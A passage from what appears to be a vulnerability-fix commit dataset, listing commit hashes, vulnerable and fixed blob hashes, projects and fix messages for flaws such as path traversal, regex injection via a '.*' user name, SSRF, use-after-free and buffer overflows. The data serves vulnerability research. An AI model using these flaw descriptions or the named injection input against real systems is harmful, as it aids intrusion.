ffff8800399a0000 00000000000167d0 0000000000000000 [ 5123.114049]  0000000000000000 0000000000000000 0000000000000000 00000000a7ec82c6 [ 5123.114662]  ffff88005877fe18 ffffea0000e6d940 ffff8800399a0000 ffff880054c55800 [ 5123.115264] Call Trace: [ 5123.115868]  [<ffffffffa03fb44b>] nfs4_try_migration+0xbb/0x220 [nfsv4] [ 5123.116487]  [<ffffffffa03fcb3b>] nfs4_run_state_manager+0x4ab/0x7b0 [nfsv4] [ 5123.117104]  [<ffffffffa03fc690>] ? nfs4_do_reclaim+0x510/0x510 [nfsv4] [ 5123.117813]  [<ffffffff810a4527>] kthread+0xd7/0xf0 [ 5123.118456]  [<ffffffff810a4450>] ? kthread_worker_fn+0x160/0x160 [ 5123.119108]  [<ffffffff816d9cdf>] ret_from_fork+0x3f/0x70 [ 5123.119723]  [<ffffffff810a4450>] ? kthread_worker_fn+0x160/0x160 [ 5123.120329] Code: 4c 8b 6a 58 74 17 eb 52 48 8d 55 a8 89 c6 4c 89 e7 e8 4a b5 ff ff 8b 45 b0 85 c0 74 1c 4c 89 f9 48 8b 55 90 48 8b 75 98 48 89 df <41> ff 55 00 3d e8 d8 ff ff 41 89 c6 74 cf 48 8b 4d c8 65 48 33 [ 5123.121643] RIP  [<ffffffffa03ed38b>] nfs4_proc_get_locations+0x9b/0x120 [nfsv4] [ 5123.122308]  RSP <ffff88005877fdb8> [ 5123.122942] CR2: 0000000000000000\n\nFixes: ec011fe847 ("NFS: Introduce a vector of migration recovery ops") Cc: stable@vger.kernel.org # v3.13+ Signed-off-by: Kinglong Mee <kinglongmee@gmail.com> Signed-off-by: Trond Myklebust <trond.myklebust@primarydata.com>

======================================================================
Commit With Fix: 
    bcaf452e516c02c9bed584a73736431c5e8831f1
File(s) In Commit: 
    radicale/storage/multifilesystem.py
Blob(s) In Commit: 
    93cec8743ee707e3ecd82ab15244f7dc263725e2
Blob(s) Before Fix: 
    30f8c2dc25afe1a11e7288d62ffe314b500999d7
    fe5637d4c287cdfc894304633490441d4ab5b37f
Projects:
    Aeysol_Radicale
Commit Message for bcaf452e516c02c9bed584a73736431c5e8831f1:
Convert component names safely to filenames Component names are controlled by the user and without this checks access to arbitrary files is possible if the multifilesystem backend is used.

======================================================================
Commit With Fix: 
    4bfe7c9f7991d534c8b9fbe153af9d341f925f98
File(s) In Commit: 
    radicale/rights/regex.py
Blob(s) In Commit: 
    39c39ae3701d3a5f81846d460ec28fe7191552e3
Blob(s) Before Fix: 
    35e5893c69f46af4f57ac649bae335d77664c3de
Projects:
    Aeysol_Radicale
Commit Message for 4bfe7c9f7991d534c8b9fbe153af9d341f925f98:
Prevent "regex injection"\n\nIf an attacker is able to authenticate with a user name like .* he can bypass limitations imposed by "owner_write" and "owner_only".

======================================================================
Commit With Fix: 
    651e150091c61fb60ad1dff2bc2166185a83d9d6
File(s) In Commit: 
    symphony/content/content.systempreferences.php
Blob(s) In Commit: 
    a1cf73d59fc5fa9230fb17ec86a5c89ea2795cff
Blob(s) Before Fix: 
    424e3f6a52c6b691f4a989deb317aef108b4c6c9
    a19c49f0faf28d3de829cd70d403f2d71f4d601c
    c3019b10da68fb6fd065417947027c2ab51271b8
Projects:
    1900_symphony-2
Commit Message for 651e150091c61fb60ad1dff2bc2166185a83d9d6:
Sanitize the POST for the system/preferences/

======================================================================
Commit With Fix: 
    635682a14427d241bab7bbdeebb48a7d7b91638e
File(s) In Commit: 
    net/sctp/sm_sideeffect.c
Blob(s) In Commit: 
    6098d4c42fa91287d3cde36ac05d860f76d4fe32
Blob(s) Before Fix: 
    12d45193357cc7f1c7c14200dbda394d38a2af93
    1ff51c9d18d5d5ca925da9bd24544fe46014ad7b
    298112ca8c069e3bc473e73080c37bbd61253f50
    35df1266bf073aa9a7a4145da787ff42e95a7ee1
    730914cdb7a141599c7eebe5fd43c0f67a0549d0
    7c220e9051689a9f070d348bf31e4051723555b3
    85d39309023849725c6ecb84b463024ad1d7dcbf
    85e6f03aeb700d8e5fcdb103464add4240ce29f9
    8aab894aeabeecb410c9763e33824f5dec7a6c91
    b5327bb77458f3ae68e0098c45d00307a56ed2c5
    e5cd14307aa5c912f68779d0d717a534511d44b5
    ecae5561b9127c813fa48a37f167f5be5aad0591
    efa516b47e816b43bf8e6ad974f8dc5cc16d9ad9
    f554b9a96e077cdc9ddc57e2901f958bd7324179
    fef2acdf4a2e675c55dc9fbf2124d132499b89e3
Projects:
    0-T-0_ps4-linux
Commit Message for 635682a14427d241bab7bbdeebb48a7d7b91638e:
sctp: Prevent soft lockup when sctp_accept() is called during a timeout event\n\nA case can occur when sctp_accept() is called by the user during a heartbeat timeout event after the 4-way handshake.  Since sctp_assoc_migrate() changes both assoc->base.sk and assoc->ep, the bh_sock_lock in sctp_generate_heartbeat_event() will be taken with the listening socket but released with the new association socket. The result is a deadlock on any future attempts to take the listening socket lock.\n\nNote that this race can occur with other SCTP timeouts that take the bh_lock_sock() in the event sctp_accept() is called.\n\n BUG: soft lockup - CPU#9 stuck for 67s! [swapper:0]  ...  RIP: 0010:[<ffffffff8152d48e>]  [<ffffffff8152d48e>] _spin_lock+0x1e/0x30  RSP: 0018:ffff880028323b20  EFLAGS: 00000206  RAX: 0000000000000002 RBX: ffff880028323b20 RCX: 0000000000000000  RDX: 0000000000000000 RSI: ffff880028323be0 RDI: ffff8804632c4b48  RBP: ffffffff8100bb93 R08: 0000000000000000 R09: 0000000000000000  R10: ffff880610662280 R11: 0000000000000100 R12: ffff880028323aa0  R13: ffff8804383c3880 R14: ffff880028323a90 R15: ffffffff81534225  FS:  0000000000000000(0000) GS:ffff880028320000(0000) knlGS:0000000000000000  CS:  0010 DS: 0018 ES: 0018 CR0: 000000008005003b  CR2: 00000000006df528 CR3: 0000000001a85000 CR4: 00000000000006e0  DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000  DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400  Process swapper (pid: 0, threadinfo ffff880616b70000, task ffff880616b6cab0)  Stack:  ffff880028323c40 ffffffffa01c2582 ffff880614cfb020 0000000000000000  <d> 0100000000000000 00000014383a6c44 ffff8804383c3880 ffff880614e93c00  <d> ffff880614e93c00 0000000000000000 ffff8804632c4b00 ffff8804383c38b8  Call Trace:  <IRQ>  [<ffffffffa01c2582>] ? sctp_rcv+0x492/0xa10 [sctp]  [<ffffffff8148c559>] ? nf_iterate+0x69/0xb0  [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8148c716>] ? nf_hook_slow+0x76/0x120  [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8149757d>] ? ip_local_deliver_finish+0xdd/0x2d0  [<ffffffff81497808>] ? ip_local_deliver+0x98/0xa0  [<ffffffff81496ccd>] ? ip_rcv_finish+0x12d/0x440  [<ffffffff81497255>] ? ip_rcv+0x275/0x350  [<ffffffff8145cfeb>] ? __netif_receive_skb+0x4ab/0x750  ...\n\nWith lockdep debugging:\n\n =====================================  [ BUG: bad unlock balance detected! ]  -------------------------------------  CslRx/12087 is trying to release lock (slock-AF_INET) at:  [<ffffffffa01bcae0>] sctp_generate_timeout_event+0x40/0xe0 [sctp]  but there are no more locks to release!\n\n other info that might help us debug this:  2 locks held by CslRx/12087:  #0:  (&asoc->timers[i]){+.-...}, at: [<ffffffff8108ce1f>] run_timer_softirq+0x16f/0x3e0  #1:  (slock-AF_INET){+.-...}, at: [<ffffffffa01bcac3>] sctp_generate_timeout_event+0x23/0xe0 [sctp]\n\nEnsure the socket taken is also the same one that is released by saving a copy of the socket before entering the timeout event critical section.\n\nSigned-off-by: Karl Heiss <kheiss@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3ca8138f014a913f98e6ef40e939868e1e9ea876
File(s) In Commit: 
    fs/fuse/file.c
Blob(s) In Commit: 
    195476a24148ba01d6609b72f60c98596d2065e1
Blob(s) Before Fix: 
    f523f2f04c196db5b1201a38a6e3222ae40d1724
Projects:
    0-T-0_ps4-linux
Commit Message for 3ca8138f014a913f98e6ef40e939868e1e9ea876:
fuse: break infinite loop in fuse_fill_write_pages()\n\nI got a report about unkillable task eating CPU. Further investigation shows, that the problem is in the fuse_fill_write_pages() function. If iov's first segment has zero length, we get an infinite loop, because we never reach iov_iter_advance() call.\n\nFix this by calling iov_iter_advance() before repeating an attempt to copy data from userspace.\n\nA similar problem is described in 124d3b7041f ("fix writev regression: pan hanging unkillable and un-straceable"). If zero-length segmend is followed by segment with invalid address, iov_iter_fault_in_readable() checks only first segment (zero-length), iov_iter_copy_from_user_atomic() skips it, fails at second and returns zero -> goto again without skipping zero-length segment.\n\nPatch calls iov_iter_advance() before goto again: we'll skip zero-length segment at second iteraction and iov_iter_fault_in_readable() will detect invalid address.\n\nSpecial thanks to Konstantin Khlebnikov, who helped a lot with the commit description.\n\nCc: Andrew Morton <akpm@linux-foundation.org> Cc: Maxim Patlasov <mpatlasov@parallels.com> Cc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru> Signed-off-by: Roman Gushchin <klamm@yandex-team.ru> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Fixes: ea9b9907b82a ("fuse: implement perform_write") Cc: <stable@vger.kernel.org>

======================================================================
Commit With Fix: 
    94f9cd81436c85d8c3a318ba92e236ede73752fc
File(s) In Commit: 
    net/netfilter/nf_nat_redirect.c
Blob(s) In Commit: 
    d43869879fcfcea6ca23e3a579bd21f8aa855b10
Blob(s) Before Fix: 
    25b06b959118d287d574ae649dae4a863aab6f13
    78a9e6454ff3d712926397beb904b478b8fab0f1
    86067560a3184f26c521e35b8f63e4952c95955e
    97b75f9bfbcd6852bdff9ca2d2e218b3539a0f8b
    adee04af8d43f519402c20b4f1a8bd11929a2159
    f91579c821e9abf4981c5bf6a59ff560a1aa0347
Projects:
    0-T-0_ps4-linux
Commit Message for 94f9cd81436c85d8c3a318ba92e236ede73752fc:
netfilter: nf_nat_redirect: add missing NULL pointer check\n\nCommit 8b13eddfdf04cbfa561725cfc42d6868fe896f56 ("netfilter: refactor NAT redirect IPv4 to use it from nf_tables") has introduced a trivial logic change which can result in the following crash.\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000030 IP: [<ffffffffa033002d>] nf_nat_redirect_ipv4+0x2d/0xa0 [nf_nat_redirect] PGD 3ba662067 PUD 3ba661067 PMD 0 Oops: 0000 [#1] SMP Modules linked in: ipv6(E) xt_REDIRECT(E) nf_nat_redirect(E) xt_tcpudp(E) iptable_nat(E) nf_conntrack_ipv4(E) nf_defrag_ipv4(E) nf_nat_ipv4(E) nf_nat(E) nf_conntrack(E) ip_tables(E) x_tables(E) binfmt_misc(E) xfs(E) libcrc32c(E) evbug(E) evdev(E) psmouse(E) i2c_piix4(E) i2c_core(E) acpi_cpufreq(E) button(E) ext4(E) crc16(E) jbd2(E) mbcache(E) dm_mirror(E) dm_region_hash(E) dm_log(E) dm_mod(E) CPU: 0 PID: 2536 Comm: ip Tainted: G            E   4.1.7-15.23.amzn1.x86_64 #1 Hardware name: Xen HVM domU, BIOS 4.2.amazon 05/06/2015 task: ffff8800eb438000 ti: ffff8803ba664000 task.ti: ffff8803ba664000 [...] Call Trace:  <IRQ>  [<ffffffffa0334065>] redirect_tg4+0x15/0x20 [xt_REDIRECT]  [<ffffffffa02e2e99>] ipt_do_table+0x2b9/0x5e1 [ip_tables]  [<ffffffffa0328045>] iptable_nat_do_chain+0x25/0x30 [iptable_nat]  [<ffffffffa031777d>] nf_nat_ipv4_fn+0x13d/0x1f0 [nf_nat_ipv4]  [<ffffffffa0328020>] ? iptable_nat_ipv4_fn+0x20/0x20 [iptable_nat]  [<ffffffffa031785e>] nf_nat_ipv4_in+0x2e/0x90 [nf_nat_ipv4]  [<ffffffffa03280a5>] iptable_nat_ipv4_in+0x15/0x20 [iptable_nat]  [<ffffffff81449137>] nf_iterate+0x57/0x80  [<ffffffff814491f7>] nf_hook_slow+0x97/0x100  [<ffffffff814504d4>] ip_rcv+0x314/0x400\n\nunsigned int nf_nat_redirect_ipv4(struct sk_buff *skb, ... { ... 		rcu_read_lock()  		indev = __in_dev_get_rcu(skb->dev)  		if (indev != NULL) { 			ifa = indev->ifa_list  			newdst = ifa->ifa_local  <--- 		} 		rcu_read_unlock()  ... }\n\nBefore the commit, 'ifa' had been always checked before access. After the commit, however, it could be accessed even if it's NULL. Interestingly, this was once fixed in 2003.\n\nhttp://marc.info/?l=netfilter-devel&m=106668497403047&w=2\n\nIn addition to the original one, we have seen the crash when packets that need to be redirected somehow arrive on an interface which hasn't been yet fully configured.\n\nThis change just reverts the logic to the old behavior to avoid the crash.\n\nFixes: 8b13eddfdf04 ("netfilter: refactor NAT redirect IPv4 to use it from nf_tables") Signed-off-by: Munehisa Kamata <kamatam@amazon.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    11d74fa5a22fe626c5e5a010b703cd46a136f253
File(s) In Commit: 
    framework/Core/lib/Horde/Core/Ui/VarRenderer/Html.php
Blob(s) In Commit: 
    580dc27409d2373d8827f190549d90a82d840e6d
Blob(s) Before Fix: 
    62ae5599915204265627fb24a3a43f16d56782d0
Projects:
    1sn0m4d_horde
Commit Message for 11d74fa5a22fe626c5e5a010b703cd46a136f253:
Escape form value.\n\nEven though this is a numeric field, this isn't enforced until the form is submitted.

======================================================================
Commit With Fix: 
    67f1aee6f45059fd6b0f5b0ecb2c97ad0451f6b3
File(s) In Commit: 
    drivers/infiniband/hw/cxgb3/iwch_cm.c
Blob(s) In Commit: 
    f504ba73e5dc27200c988f342ee3d6423072ee9e
Blob(s) Before Fix: 
    04bbf172abde10a090678f62cfb4c3d48b044c1b
    095bb046e2c82eb8ded011eba72a486b376b444f
    1c90c86fc8b83d2bd3a9c2fe75a8ff16beda1925
    3e094cd6a0e345e1e239c96348e162cc53184fa7
    3e8431b5cad733d778b27e481bd44ade8a50c35c
    66b41351910ad390d5ec70dbb18c5ab99a196f45
    740dcc065cf2f46a3f33c00db555f00b48736139
    875348699e6ecb6c59e34da106ea99f6fe7180c8
    a9194ef626cdd1f8f8e0caa16b4064ffeacb5816
    b61630eba912ed49658cf26618cb5e222b1b3c78
    cb78b1e9bcd9ec3035884e3c0c6504bf317dbfc8
Projects:
    0-T-0_ps4-linux
Commit Message for 67f1aee6f45059fd6b0f5b0ecb2c97ad0451f6b3:
iw_cxgb3: Fix incorrectly returning error on success\n\nThe cxgb3_*_send() functions return NET_XMIT_ values, which are positive integers values. So don't treat positive return values as an error.\n\nSigned-off-by: Steve Wise <swise@opengridcomputing.com> Signed-off-by: Hariprasad Shenai <hariprasad@chelsio.com> Signed-off-by: Doug Ledford <dledford@redhat.com>

======================================================================
Commit With Fix: 
    924a016ffe7ae7ea6d516c07a7852f0095eddbce
File(s) In Commit: 
    src/Umbraco.Web/umbraco.presentation/umbraco/dashboard/FeedProxy.aspx.cs
Blob(s) In Commit: 
    b304cda0b6ac37b71776a80e89e458cde486416f
Blob(s) Before Fix: 
    a938935d2b4ae8f5196981d49b727422b48288b1
    b62b6d0bc39efe3e74bb3965222dbae065f60660
Projects:
    0Neji_Umbraco-CMS
Commit Message for 924a016ffe7ae7ea6d516c07a7852f0095eddbce:
Fixes U4-7457 Server side request forgery (xsrf) in feedproxy.aspx

======================================================================
Commit With Fix: 
    e50293ef9775c5f1cf3fcc093037dd6a8c5684ea
File(s) In Commit: 
    drivers/usb/core/hub.c
Blob(s) In Commit: 
    ddbf32d599cba4e51aeb81eea8519500a8bbea01
Blob(s) Before Fix: 
    090469ebfcfff3a1fb686c4adbf0817bc1b27f22
    0e950ad8cb2525fd0b335a20b46d2fc28f814f9f
    12b0d1275ff261429a3ddd682fb5eaa8389a5de6
    1e9a8c9aa531fa143e89a3460ea7d69b67d00787
    2246954d7df34940515bfee4a9ff623bdea7dad8
    3b7151687776817bf34981c878833a25fbda119f
    431839bd291f0b2ab2d66b0019c16f04421efc3e
    43cb2f2e3b4375aee6c362e8b08d5f2b71865d8f
    51b436918f7892b1249c7ec1b19dad515a9a5755
    73dfa194160b78fba6bec233b667b00bceac6cb1
    8f9ff4d4c442df4e9668ac32226f77cf33e542e5
    a5cc032ef77a8da22b86d9b29e4090e897d0bcc1
    aeb50bb6ba9ca17e345f3e7e737560d03b88abbe
    b649fef2e35d4af1e9e8a206e73c0ed799049a1b
    bdeadc112d29f9b4545bf3ab82645b52982f5cfd
    d7c3d5a35946a63a905dc2501ec72beae0c5fe42
    ec6c97dadbe4dba5e3cf8a47980e23256a44bff5
    feef9351463d99845a379ee3cdd1cb32b6772a4c
Projects:
    0-T-0_ps4-linux
Commit Message for e50293ef9775c5f1cf3fcc093037dd6a8c5684ea:
USB: fix invalid memory access in hub_activate()\n\nCommit 8520f38099cc ("USB: change hub initialization sleeps to delayed_work") changed the hub_activate() routine to make part of it run in a workqueue.  However, the commit failed to take a reference to the usb_hub structure or to lock the hub interface while doing so.  As a result, if a hub is plugged in and quickly unplugged before the work routine can run, the routine will try to access memory that has been deallocated.  Or, if the hub is unplugged while the routine is running, the memory may be deallocated while it is in active use.\n\nThis patch fixes the problem by taking a reference to the usb_hub at the start of hub_activate() and releasing it at the end (when the work is finished), and by locking the hub interface while the work routine is running.  It also adds a check at the start of the routine to see if the hub has already been disconnected, in which nothing should be done.\n\nSigned-off-by: Alan Stern <stern@rowland.harvard.edu> Reported-by: Alexandru Cornea <alexandru.cornea@intel.com> Tested-by: Alexandru Cornea <alexandru.cornea@intel.com> Fixes: 8520f38099cc ("USB: change hub initialization sleeps to delayed_work") CC: <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    afae249efa4774c6676738ac5de6aeb4daf4889f
File(s) In Commit: 
    tmpfiles.d/systemd.conf.m4
Blob(s) In Commit: 
    0575408dbe21729c07b328aaa539e430300e5ba0
Blob(s) Before Fix: 
    d9d51af9292b373ba8bf821dd599138b5bbe3b6d
    fcd6ec0269ae01386abc424f1efb9748cfe72810
Projects:
    0x277F_systemd
Commit Message for afae249efa4774c6676738ac5de6aeb4daf4889f:
tmpfiles: set acls on system.journal explicitly\n\nhttps://github.com/systemd/systemd/issues/1397

======================================================================
Commit With Fix: 
    7f821fc9c77a9b01fe7b1d6e72717b33d8d64142
File(s) In Commit: 
    arch/powerpc/kernel/process.c
Blob(s) In Commit: 
    646bf4d222c1caeda5c7851de74fbbe0ad0d65d9
Blob(s) Before Fix: 
    0596373cd1c31b20e5caa60fccbb7f4d44797b2b
    31d021506d210e6b7cf1fa4136b1067f8163dc05
    3386d8ab7eb0607b3c9d6f03e68824d4abe4bd88
    3c5736e52a14b7d42dd0c28425e709b0a7147c3c
    4937c9690090d0e9bf3809b7ae923ae24d181d93
    54ed9c7663e67897ae485ec6c2e5a063f2bf8f1e
    6f428da53e2085b877334270286069e2ba54da37
    75b6676c1a0b911b72b7af5a8dc7761173e638e8
    8005e18d1b40381f6b815890b0d58c99a382b4e8
    923cd2daba89d88f37299b0a0f19803cdacb2532
    96d2fdf3aa9ebe3bba547fd567c5a232be20ec9a
    a902723fdc69b0857d3d8658e32790614983c626
    b4cc7bef6b16d88d8ba5a27d60d7df13d2f7e74a
    be99774d3f44ac9ecc83d5e637a7bb4b4f460d80
    cf788d7d7e56fdf59abc796874ed3886eb821217
    ebe5766781aa8c9eca7d96849ca034233e043308
    ef2ad2d682dae74f97598fa4a789b59058368a29
    ef5f566f39772b31e46fe3618b1d355314ef6c02
    febb50dd53285d8cbee941e5895bcbcb3bc77b8f
Projects:
    0-T-0_ps4-linux
Commit Message for 7f821fc9c77a9b01fe7b1d6e72717b33d8d64142:
powerpc/tm: Check for already reclaimed tasks\n\nCurrently we can hit a scenario where we'll tm_reclaim() twice.  This results in a TM bad thing exception because the second reclaim occurs when not in suspend mode.\n\nThe scenario in which this can happen is the following.  We attempt to deliver a signal to userspace.  To do this we need obtain the stack pointer to write the signal context.  To get this stack pointer we must tm_reclaim() in case we need to use the checkpointed stack pointer (see get_tm_stackpointer()).  Normally we'd then return directly to userspace to deliver the signal without going through __switch_to().\n\nUnfortunatley, if at this point we get an error (such as a bad userspace stack pointer), we need to exit the process.  The exit will result in a __switch_to().  __switch_to() will attempt to save the process state which results in another tm_reclaim().  This tm_reclaim() now causes a TM Bad Thing exception as this state has already been saved and the processor is no longer in TM suspend mode. Whee!\n\nThis patch checks the state of the MSR to ensure we are TM suspended before we attempt the tm_reclaim().  If we've already saved the state away, we should no longer be in TM suspend mode.  This has the additional advantage of checking for a potential TM Bad Thing exception.\n\nFound using syscall fuzzer.\n\nFixes: fb09692e71f1 ("powerpc: Add reclaim and recheckpoint functions for context switching transactional memory processes") Cc: stable@vger.kernel.org # v3.9+ Signed-off-by: Michael Neuling <mikey@neuling.org> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

======================================================================
Commit With Fix: 
    8eb1367ca44e772963e704a700ef72ae2e12babd
File(s) In Commit: 
    src/jv_parse.c
Blob(s) In Commit: 
    84245b867e5d8a1f1fc4e22cb1ee46e53da075df
Blob(s) Before Fix: 
    3102ed4fbc1e62a6da40fd0d182a1fac97ac6857
    5b703fd712b056501ff8d8c4f6f499171302b02f
Projects:
    0xflotus_jq
Commit Message for 8eb1367ca44e772963e704a700ef72ae2e12babd:
Heap buffer overflow in tokenadd() (fix #105)\n\nThis was an off-by one: the NUL terminator byte was not allocated on resize.  This was triggered by JSON-encoded numbers longer than 256 bytes.

======================================================================
Commit With Fix: 
    6713ca45e7757297381f4b4cdb9cf5e624a9ad36
File(s) In Commit: 
    src/funcs.c
Blob(s) In Commit: 
    b7160cc73474ce8d85903a6bfccaec5162c7919b
Blob(s) Before Fix: 
    7ce431e5f51c43a7e17ed0b664cb156dfb45100a
    b44f5623ab20ff73450a88fed4de700c1d1ce7e6
    febd3bc3a0264de2651426734d387cbdd5bbdde4
Projects:
    5hadowblad3_file
Commit Message for 6713ca45e7757297381f4b4cdb9cf5e624a9ad36:
PR/454: Fix memory corruption when the continuation level jumps by more than 20 in a single step.

======================================================================
Commit With Fix: 
    940100c28ae28931722290794889cf84a92c5f6f
File(s) In Commit: 
    src/lib/openjp2/j2k.c
Blob(s) In Commit: 
    d487d89d7c6a63b660dc6f583864d784c803af4f
Blob(s) Before Fix: 
    19a48f5648057fc9ed9955ba990450d82dd73d2c
Projects:
    01bui_openjpeg
Commit Message for 940100c28ae28931722290794889cf84a92c5f6f:
Fix potential use-after-free in opj_j2k_write_mco function\n\nFixes #563

======================================================================
Commit With Fix: 
    07908124838afcc99c577d1d3e84cef2dbd39cb7
File(s) In Commit: 
    src/fat.c
Blob(s) In Commit: 
    845b748dbe1d9f676f70235fe24352da324524af
Blob(s) Before Fix: 
    0c1918496133ab3cbf6efc3c49119b859a90232d
Projects:
    10100010meow_dosfstools
Commit Message for 07908124838afcc99c577d1d3e84cef2dbd39cb7:
set_fat(): Fix off-by-2 error leading to corruption in FAT12\n\nIn FAT12 two 12 bit entries are combined to a 24 bit value (three bytes). Therefore, when an even numbered FAT entry is set in FAT12, it must be be combined with the following entry. To prevent accessing beyond the end of the FAT array, it must be checked that the cluster is not the last one.\n\nPreviously, the check tested that the requested cluster was equal to fs->clusters - 1. However, fs->clusters is the number of data clusters not including the two reserved FAT entries at the start so the test triggered two clusters early.\n\nIf the third to last entry was written on a FAT12 filesystem with an odd number of clusters, the second to last entry would be corrupted. This corruption may also lead to invalid memory accesses when the corrupted entry becomes out of bounds and is used later.\n\nChange the test to fs->clusters + 1 to fix.\n\nReported-by: Hanno Böck Signed-off-by: Andreas Bombe <aeb@debian.org>

======================================================================
Commit With Fix: 
    4751b606fa38edc456d627140898a7ec679fcc24
File(s) In Commit: 
    src/gd_interpolation.c
Blob(s) In Commit: 
    f00c946228652e922057d5e94b714754ef43b4ff
Blob(s) Before Fix: 
    fcc11e6e4beedaf9737e23af8b9cdb650e73ce59
Projects:
    86salo_libgd
Commit Message for 4751b606fa38edc456d627140898a7ec679fcc24:
gdImageScaleTwoPass memory leak fix\n\nFixing memory leak in gdImageScaleTwoPass, as reported by @cmb69 and confirmed by @vapier.  This bug actually bit me in production and I'm very thankful that it was reported with an easy fix.\n\nFixes #173.

======================================================================
Commit With Fix: 
    4f68e9661518463fca523c9726bb5d940a2aa6d8
File(s) In Commit: 
    coders/tga.c
Blob(s) In Commit: 
    781933dfbd0c6bcba96c8af93819069282c63410
Blob(s) Before Fix: 
    c2d760425dcbca815db82d8aa267ea6818cc2825
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4f68e9661518463fca523c9726bb5d940a2aa6d8:
https://bugs.launchpad.net/ubuntu/+source/imagemagick/+bug/1490362

======================================================================
Commit With Fix: 
    7b1cf5784b5bcd85aa9293ecf56769f68c037231
File(s) In Commit: 
    MagickCore/transform.c
Blob(s) In Commit: 
    c3967242d04e97405167e13d82468f13c58f3cc9
Blob(s) Before Fix: 
    2e9040b30c629f371b7ab49fd8600c2ab015cd4d
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 7b1cf5784b5bcd85aa9293ecf56769f68c037231:
Fixed out of bounds error in SpliceImage.

======================================================================
Commit With Fix: 
    5b4bebaa91849c592a8448bc353ab25a54ff8c44
File(s) In Commit: 
    MagickCore/constitute.c
Blob(s) In Commit: 
    dc6ec49c131aff898964ae458eb8ead7aee361e3
Blob(s) Before Fix: 
    24176f0b6aee5836d31288d0e4909cba6e9def5a
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 5b4bebaa91849c592a8448bc353ab25a54ff8c44:
https://github.com/ImageMagick/ImageMagick/pull/34

======================================================================
Commit With Fix: 
    97aa7d7cfd2027f6ba7ce42caf8b798541b9cdc6
File(s) In Commit: 
    coders/hdr.c
Blob(s) In Commit: 
    cd07f22e7fc0ea5ad68684e9f2a94fabc524a02f
Blob(s) Before Fix: 
    ccea763916669652f63982abbb1278d3d75708a8
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 97aa7d7cfd2027f6ba7ce42caf8b798541b9cdc6:
Fixed infinite loop and added checks for the sscanf result.

======================================================================
Commit With Fix: 
    f96664974774bfeb237a7274f512f64aaafb201e
File(s) In Commit: 
    src/hb-ot-layout-gpos-table.hh
Blob(s) In Commit: 
    568b5f63a96013f487a861202e10c6ad637b2512
Blob(s) Before Fix: 
    286253d705ab4d649d3076dc8446303a464aced9
    69609d06cbe63066d04f73c18f038694ce42789f
    7c0a4ea66673c8399681d79c757a1d3dde743d94
    8bb91071df310f560ac17672998c290d2b747163
    996f8b59b99981b7527f6bf1a35375f71b64ac56
    ca98cb7a5c8f9b0a881809cbf1dbd5c0f6feaa0c
    d88f7876e0a81169accb2a20c0c1d21a3db20327
    da9506c76653db0a90288effbdec86e9ccf88caa
Projects:
    00ERNEST00_FFmpeg
    031087_harfbuzz
Commit Message for f96664974774bfeb237a7274f512f64aaafb201e:
Fix another memory access issue discovered by libFuzzer\n\nFixes https://github.com/behdad/harfbuzz/issues/139#issuecomment-146984679

======================================================================
Commit With Fix: 
    cf0aa7751f6ef8445e9310a64b14dc81460ca156
File(s) In Commit: 
    dbdimp.c
Blob(s) In Commit: 
    acdfee8c450b203562807f7434750fd228afe348
Blob(s) Before Fix: 
    d5075880e0e394464865da30c4218bbc3224b4e1
Projects:
    Acidburn0zzz_DBD-mysql
Commit Message for cf0aa7751f6ef8445e9310a64b14dc81460ca156:
Merge pull request #45 from hannob/master\n\nFix use after free error.

======================================================================
Commit With Fix: 
    6829e274a623187c24f7cfc0e3d35f25d087fcc5
File(s) In Commit: 
    arch/arm64/mm/dma-mapping.c
Blob(s) In Commit: 
    e0f14ee26b6818167cde2a6e955ffb59e339c9ad
Blob(s) Before Fix: 
    ef7d112f5ce0df9ca1c1a793301c2c1b3874e23f
Projects:
    0-T-0_ps4-linux
Commit Message for 6829e274a623187c24f7cfc0e3d35f25d087fcc5:
arm64: dma-mapping: always clear allocated buffers\n\nBuffers allocated by dma_alloc_coherent() are always zeroed on Alpha, ARM (32bit), MIPS, PowerPC, x86/x86_64 and probably other architectures. It turned out that some drivers rely on this 'feature'. Allocated buffer might be also exposed to userspace with dma_mmap() call, so clearing it is desired from security point of view to avoid exposing random memory to userspace. This patch unifies dma_alloc_coherent() behavior on ARM64 architecture with other implementations by unconditionally zeroing allocated buffer.\n\nCc: <stable@vger.kernel.org> # v3.14+ Signed-off-by: Marek Szyprowski <m.szyprowski@samsung.com> Signed-off-by: Will Deacon <will.deacon@arm.com>

======================================================================
Commit With Fix: 
    ab79efab0a0ba01a74df782eb7fa44b044dae8b5
File(s) In Commit: 
    fs/overlayfs/copy_up.c
Blob(s) In Commit: 
    871fcb67be9741f2aab81f3d6552306dedf4c967
Blob(s) Before Fix: 
    0a8983492d917bbc61888559e8417f738eb607be
    24f640441bd90977a079aac782768025c68f3712
    36795eed40b09ee1bbb6766e65019b8d1c6695f0
    63a0d0ba36de11ef0a606c2d098663b750b2e282
    84d693d374284b580208fec3b8eb3c57bdd4195c
    b1990ac8fa0975c5494a832ce87e6cf693981845
    d3a5990fd2b923b0bad81d028e802b703e4f77ed
    d894e7cd9a864239ea19dc86d405239ee2405607
    ea10a87191072339b1352c01f0261da054701a9b
Projects:
    0-T-0_ps4-linux
Commit Message for ab79efab0a0ba01a74df782eb7fa44b044dae8b5:
